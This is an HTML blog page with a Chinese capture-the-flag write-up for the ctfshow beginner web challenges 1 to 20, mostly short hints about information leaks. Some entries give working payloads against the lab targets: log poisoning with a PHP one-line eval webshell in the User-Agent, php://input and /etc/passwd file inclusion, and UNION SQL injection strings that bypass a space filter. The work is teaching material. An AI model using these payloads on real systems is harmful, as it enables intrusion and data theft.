@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>web入门 · 随波逐流の旅店</title>
+<style>:root{--ink:#eaf3ff;--muted:#a9c3dd;--line:rgba(255,255,255,.2);--sky:#3aa3e3;--gold:#e0a545}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{min-height:100vh;color:var(--ink);font:16px/1.85 "PingFang SC","Microsoft YaHei",system-ui,-apple-system,sans-serif;background:#0d2137 url('/SAO-bg.jpg') center/cover fixed no-repeat}
+body::before{content:'';position:fixed;inset:0;background:rgba(8,20,36,.7);z-index:-1}
+.pill{display:inline-flex;align-items:center;gap:8px;padding:7px 16px;border-radius:999px;background:rgba(226,236,248,.16);border:1px solid var(--line);color:#fff;text-decoration:none;font-size:14px;backdrop-filter:blur(12px);transition:.3s}
+.pill:hover{background:rgba(58,163,227,.5)}
+.wrap{max-width:860px;margin:0 auto;padding:44px 22px 80px}
+.panel{margin-top:18px;background:rgba(12,26,44,.62);border:1px solid var(--line);border-radius:20px;padding:34px 36px;backdrop-filter:blur(18px) saturate(140%);box-shadow:0 20px 50px rgba(5,16,30,.4)}
+h1{margin:0 0 14px;font-size:29px;line-height:1.4;color:#fff}
+.meta{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:24px;padding-bottom:18px;border-bottom:1px dashed var(--line)}
+.chip{padding:2px 11px;border-radius:999px;background:rgba(255,255,255,.12);border:1px solid var(--line);font-size:12px;color:var(--muted)}
+.chip.date{color:var(--gold)}
+article h2,article h3,article h4{color:#fff;margin:1.6em 0 .6em;line-height:1.45}
+article h2{font-size:23px;border-left:3px solid var(--sky);padding-left:12px}
+article h3{font-size:19px;color:#dcecff}
+article p{margin:.85em 0}
+article a{color:#8fd0ff}
+article img{max-width:100%;border-radius:10px;margin:14px 0}
+article ul,article ol{padding-left:1.5em}
+article li{margin:.35em 0}
+article blockquote{margin:1.2em 0;padding:10px 18px;border-left:3px solid var(--sky);background:rgba(255,255,255,.07);border-radius:0 10px 10px 0;color:var(--muted)}
+article code{background:rgba(255,255,255,.14);padding:2px 6px;border-radius:5px;font-size:.9em;color:#ffd9a8;font-family:Consolas,Monaco,monospace}
+article pre{background:rgba(6,14,26,.85);border:1px solid var(--line);border-radius:12px;padding:16px 18px;overflow:auto;margin:1.2em 0}
+article pre code{background:none;padding:0;color:#d6e6f7;font-size:13.5px;line-height:1.7}
+article table{width:100%;border-collapse:collapse;margin:1.2em 0;font-size:14px}
+article th,article td{border:1px solid var(--line);padding:8px 12px;text-align:left}
+article th{background:rgba(255,255,255,.07);color:#fff}
+article hr{border:none;border-top:1px dashed var(--line);margin:2em 0}
+.img-fallback{display:block;padding:18px;margin:14px 0;border:1px dashed var(--line);border-radius:10px;background:rgba(255,255,255,.05);color:var(--muted);font-size:13px;text-align:center}
+@media(max-width:640px){.panel{padding:22px 18px}.wrap{padding:24px 14px 60px}h1{font-size:22px}}</style>
+</head>
+<body>
+<div class="wrap">
+  <a class="pill" href="/article-list/">← 返回归档</a> <a class="pill" href="/">⌂ 主页</a>
+  <div class="panel">
+    <h1>web入门</h1>
+    <div class="meta"><span class="chip date">2023-05-12</span><span class="chip">#web</span></div>
+    <article><h3>ctfshow第一类:信息收集</h3>
+<h5>web-1</h5>
+<p>打开以后直接查看源码就可以了</p>
+<h5>web-2</h5>
+<pre><code>有几种办法
+1.ctrl  u查看源码，注释里的就是
+2.在url前面添加view-source:
+</code></pre>
+<h5>web-3</h5>
+<p>bp抓包重发就行了</p>
+<h5>web-4-1</h5>
+<p>第四个和B站上给的不一样，是一个文件泄露的</p>
+<p>wp说上来可以用php伪协议进行</p>
+<pre><code>?url=php://input放到url后面
+
+&lt;?php system(&#39;ls ./&#39;);?&gt;放到最后
+</code></pre>
+<p>返回error</p>
+<p>然后bp抓包发现是nginx的，使用</p>
+<pre><code>?url=/var/log/nginx/access.log
+</code></pre>
+<p>查看日志文件</p>
+<pre><code>HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Fri, 12 May 2023 06:20:02 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+X-Powered-By: PHP/7.3.11
+Content-Length: 5003
+
+172.12.0.6 - - [12/May/2023:05:48:15 +0000] &quot;GET / HTTP/1.1&quot; 200 715 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;
+172.12.0.6 - - [12/May/2023:05:48:40 +0000] &quot;GET /robots.txt HTTP/1.1&quot; 200 715 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;
+172.12.0.6 - - [12/May/2023:05:50:31 +0000] &quot;GET /index.php HTTP/1.1&quot; 200 715 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;
+172.12.0.6 - - [12/May/2023:05:50:37 +0000] &quot;GET /index.php HTTP/1.1&quot; 200 715 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;
+172.12.0.6 - - [12/May/2023:05:52:15 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 1367 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;
+172.12.0.6 - - [12/May/2023:05:53:41 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 1554 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;
+172.12.0.6 - - [12/May/2023:05:53:51 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 1741 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;
+172.12.0.6 - - [12/May/2023:05:54:41 +0000] &quot;GET /?url=php://input HTTP/1.1&quot; 200 15 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;
+172.12.0.6 - - [12/May/2023:05:56:21 +0000] &quot;GET /?url=php://input HTTP/1.1&quot; 200 15 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;
+172.12.0.6 - - [12/May/2023:05:58:04 +0000] &quot;GET /?url=/etc/passwd HTTP/1.1&quot; 200 2107 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;
+172.12.0.6 - - [12/May/2023:05:58:28 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 2443 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;
+172.12.0.6 - - [12/May/2023:06:01:17 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 2630 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;
+172.12.0.6 - - [12/May/2023:06:15:45 +0000] &quot;POST /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 2817 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36&quot;
+172.12.0.6 - - [12/May/2023:06:15:47 +0000] &quot;POST /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 3032 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3&quot;
+172.12.0.6 - - [12/May/2023:06:15:48 +0000] &quot;POST /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 3205 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36&quot;
+172.12.0.6 - - [12/May/2023:06:17:51 +0000] &quot;POST /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 3418 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36&quot;
+172.12.0.6 - - [12/May/2023:06:17:56 +0000] &quot;POST /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 3633 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36&quot;
+172.12.0.6 - - [12/May/2023:06:17:58 +0000] &quot;POST /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 3843 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27&quot;
+172.12.0.6 - - [12/May/2023:06:19:16 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 4086 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;
+172.12.0.6 - - [12/May/2023:06:20:01 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 4273 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;
+172.12.0.6 - - [12/May/2023:06:20:01 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 4461 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;
+172.12.0.6 - - [12/May/2023:06:20:02 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 4648 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;
+172.12.0.6 - - [12/May/2023:06:20:02 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 4829 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;
+&lt;html lang=&quot;zh-CN&quot;&gt;
+
+&lt;head&gt;
+    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0&quot; /&gt;
+    &lt;title&gt;ctf.show_web4&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;center&gt;
+    &lt;h2&gt;ctf.show_web4&lt;/h2&gt;
+    &lt;hr&gt;
+    &lt;h3&gt;
+    &lt;code&gt;&lt;span style=&quot;color: #000000&quot;&gt;
+&lt;span style=&quot;color: #0000BB&quot;&gt;&amp;lt;?php&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;include(&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;$_GET&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color: #DD0000&quot;&gt;&#39;url&#39;&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;]);&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/span&gt;
+&lt;/code&gt;    &lt;/center&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>然后在user-agent后面加了一个</p>
+<pre><code>&lt;?php eval($_POST[&#39;cmd&#39;]); ?&gt;
+</code></pre>
+<p>一句话木马，使用蚁剑连接</p>
+<p>密码就是cmd</p>
+<p>在var/www/下面找到flag.txt</p>
+<h5>web-4-2</h5>
+<p>机器人协议robots.txt</p>
+<p>机器人协议，爬虫协议，本质是网站和搜索引擎爬虫的沟通方式，用来指导搜索引擎更好地抓取网站内容，</p>
+<h5>web-5</h5>
+<pre><code>
+ctf.show_web5
+where is flag?
+&lt;?php
+error_reporting(0);
+    
+?&gt;
+&lt;html lang=&quot;zh-CN&quot;&gt;
+
+&lt;head&gt;
+    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0&quot; /&gt;
+    &lt;title&gt;ctf.show_web5&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;center&gt;
+    &lt;h2&gt;ctf.show_web5&lt;/h2&gt;
+    &lt;hr&gt;
+    &lt;h3&gt;
+    &lt;/center&gt;
+    &lt;?php
+        $flag=&quot;&quot;;
+        $v1=$_GET[&#39;v1&#39;];
+        $v2=$_GET[&#39;v2&#39;];
+        if(isset($v1) &amp;&amp; isset($v2)){
+            if(!ctype_alpha($v1)){
+                die(&quot;v1 error&quot;);
+            }
+            if(!is_numeric($v2)){
+                die(&quot;v2 error&quot;);
+            }
+            if(md5($v1)==md5($v2)){
+                echo $flag;
+            }
+        }else{
+        
+            echo &quot;where is flag?&quot;;
+        }
+    ?&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>这道题限制第一个只能是字母第二个只能是数字</p>
+<p>第一个和第二个的md5值要相等</p>
+<p>可以使用md5的0E绕过，详细可以来看这个</p>
+<pre><code>https://blog.csdn.net/wangyuxiang946/article/details/119845182
+</code></pre>
+<h5>web-6-1</h5>
+<p>这是一个文件泄露的题目，可以用<a href="http://www.zip%E4%B8%8B%E8%BD%BD%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6">www.zip下载备份文件</a></p>
+<h5>web-6-2</h5>
+<p>不懂为什么，我再打开一次这个是一个sql注入的题目</p>
+<p>输入万能钥匙发现过滤了空格，</p>
+<pre><code>一般空格被过滤有如下替换方法
+1./**/
+2.()
+3.回车(url编码中的%0a)
+4.`(tap键上面的按钮)
+5.tap
+6.两个空格
+</code></pre>
+<p>我们就选用/**/来替换空格</p>
+<p>输入</p>
+<pre><code>username=1&#39;/**/or/**/1=1/**/union/**/select/**/1,2,3/**/#&amp;password=123（判断回显位置）password随便写就行
+username=123&#39;/**/or/**/1=1/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/#&amp;password=123  #获取表名
+username=123&#39;/**/or/**/1=1/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name=&#39;flag&#39;/**/#&amp;password=123  #获取列名
+username=123&#39;/**/or/**/1=1/**/union/**/select/**/1,group_concat(flag),3/**/from/**/flag/**/#&amp;password=123  #拿到flag
+</code></pre>
+<h5>web-7</h5>
+<h5>web-8</h5>
+<p>都是一样的，找到注入点后用python自动化脱库脚本爆破就好了</p>
+<h5>web-9</h5>
+<p>vim在异常关闭时会产生swp可交换文件</p>
+<p>这道题的答案就是在里面的</p>
+<h5>web-10</h5>
+<p>将flag放到cookie里面，刷新网页然后使用F12查看cookie即可</p>
+<h4>1-10总结</h4>
+<p>前十个里面有这么几种信息收集的方式</p>
+<p>cookie</p>
+<p>swp交换文件</p>
+<p>sql注入</p>
+<p>源码，注释，bp抓包里面</p>
+<p>绕过md5的0E等等</p>
+<p>robots.txt爬虫协议</p>
+<h5>web-11</h5>
+<p>网站的域名也会隐藏信息</p>
+<p>这道题中用<a href="http://dbcha.com/%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E8%8E%B7%E5%BE%97%EF%BC%88A%E8%AE%B0%E5%BD%95%E6%94%B9%E6%88%90txt">http://dbcha.com/可以直接获得（A记录改成txt</a></p>
+<h5>web-12</h5>
+<p>这个题目中，他是一个网站</p>
+<p>登录到/admin里面以后</p>
+<p>要求输入账户密码，账户使用默认账户，密码的话网站中可能存在，所以找了找试了试最下面的电话，成功</p>
+<p><em>常见的渗透思路</em></p>
+<h5>web-13</h5>
+<p>这个是一个考眼力的题目，他在最下面第三个里有一个唯一小些的document,并且可以打开文档。里面有这个东西的使用</p>
+<p>说明，值得注意的是，里面的</p>
+<p><a href="http://your-domain/%E6%98%AF%E4%BD%A0%E7%9A%84%E5%9F%9F%E5%90%8D%E7%9A%84%E6%84%8F%E6%80%9D%EF%BC%8C%E5%9C%A8%E8%BF%99%E4%B8%AA%E9%A2%98%E7%9B%AE%E4%B8%AD%E7%9A%84%E6%84%8F%E6%80%9D%E5%B0%B1%E6%98%AF%E7%9B%B4%E6%8E%A5%E5%A5%97%E5%88%B0%E9%9D%B6%E5%9C%BA%E7%9A%84%E7%8E%AF%E5%A2%83%E4%B8%8A%E5%B0%B1%E5%8F%AF%E4%BB%A5">http://your-domain/是你的域名的意思，在这个题目中的意思就是直接套到靶场的环境上就可以</a></p>
+<h5>web-14</h5>
+<p>打开之后是一个巨信的界面</p>
+<p>提示说是编译器的问题，所以要在源码中搜索editor</p>
+<p>发现一个这个</p>
+<pre><code>&lt;img src=&quot;editor/upload/banner-app.png&quot; alt=&quot;App&quot;&gt;
+</code></pre>
+<p>说明是有编译器的（据说是百度的</p>
+<pre><code>http://000cf48d-1993-417b-97f9-e0c5e21627ff.challenge.ctf.show/editor/
+</code></pre>
+<p>打开以后可以看到有一系列的文件上传什么的，在插入文件的文件空间中</p>
+<pre><code>/editor/attached/file/var/www/html/nothinghere/fl000g.txt
+</code></pre>
+<p>发现这么个东西</p>
+<p>输入到url不对，看了show的视频说是（注意url形式</p>
+<pre><code>/editor/attached/file/这一段是编译器的绝对路径
+var/www/html/
+nothinghere/fl000g.txt只需要输入这个就可以了
+</code></pre>
+<pre><code>http://000cf48d-1993-417b-97f9-e0c5e21627ff.challenge.ctf.show/nothinghere/fl000g.txt
+</code></pre>
+<h5>web-15</h5>
+<p>有点社工的感觉，这道题有个邮箱提示，在网站中输入admin可以进入管理员登录界面，刚开始输入邮箱作为密码会提示密码错误，但是有一个忘记密码</p>
+<p>忘记密码的提示是我生活在什么城市，这个可以通过QQ邮箱来进行社工，找到以后就OK了</p>
+<h5>web-16</h5>
+<p>打开是一个元素周期表，提示说是探针忘记删除了，所以可以通过tz.php进行查看参数，在里面找flag</p>
+<h5>web-17</h5>
+<p>备份的sql文件会泄露数据</p>
+<p>backup.sql直接进就行</p>
+<h5>web-18</h5>
+<p>这道题在源码中找js文件，js里面有一个gameover</p>
+<pre><code>\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b)
+</code></pre>
+<p>在控制台中构造一个alert即可</p>
+<h5>web-19</h5>
+<p>在源码中看到</p>
+<pre><code> if(isset($u) &amp;&amp; isset($p)){
+        if($u===&#39;admin&#39; &amp;&amp; $p ===&#39;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#39;){
+            echo $flag;
+        }
+}
+</code></pre>
+<p>往上看的话看到p=pazzword，u=username，post传参即可</p>
+<h5>web-20</h5>
+<p>这个是一个数据库的题，他说自己是</p>
+<pre><code>我是asp程序，我用的access数据库
+</code></pre>
+<p>看了看视频说可以尝试mdb.db或者data.db或db.mdb，第三个成功了</p>
+<p>用查看器查看就能得到（注意要拉开表</p>
+<h4>web信息收集总结</h4>
+<p>主要还是靠眼力,另外,swp,sql,数据库,探针,编译器等等也会泄露信息</p>
+<p>此外post传参,源码,等等的也会，做题的时候注意一下</p>
+</article>
+  </div>
+</div><script>
+  // 正文插图兜底：失效图片替换为占位块，避免出现破图
+  document.querySelectorAll('article img').forEach(function (img) {
+    img.loading = 'lazy';
+    img.addEventListener('error', function () {
+      var ph = document.createElement('span');
+      ph.className = 'img-fallback';
+      ph.textContent = '图片已失效 · ' + (img.getAttribute('alt') || '');
+      if (img.parentNode) img.parentNode.replaceChild(ph, img);
+    });
+  });
+</script></body>
+</html>
